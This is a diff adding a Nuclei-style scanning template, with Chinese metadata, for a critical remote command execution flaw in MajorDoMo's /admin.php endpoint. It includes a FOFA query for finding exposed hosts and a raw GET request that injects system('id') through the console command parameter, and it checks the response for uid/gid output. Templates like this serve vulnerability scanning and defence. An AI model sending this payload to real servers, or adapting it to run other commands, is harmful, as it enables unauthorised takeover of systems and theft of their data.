@@ -1,0 +1,25 @@
+id: MajorDoMo-admin_php-RCE
+
+info:
+  name: MajorDoMo /admin.php 远程命令执行
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: body="templates/application.html"
+    MajorDoMo 系统 /admin.php 接口存在远程命令执行漏洞，攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。
+  reference:
+    - 
+  tags: rce, majordomo, admin, php
+
+http:
+  - raw:
+      - |-
+        GET /admin.php?ajax_panel=1&op=console&command=echo+system%28%27id%27%29%3B HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 远程命令执行
+        dsl:
+          - "status_code == 200 && contains_all(body, 'uid=', 'gid=', 'groups=')"
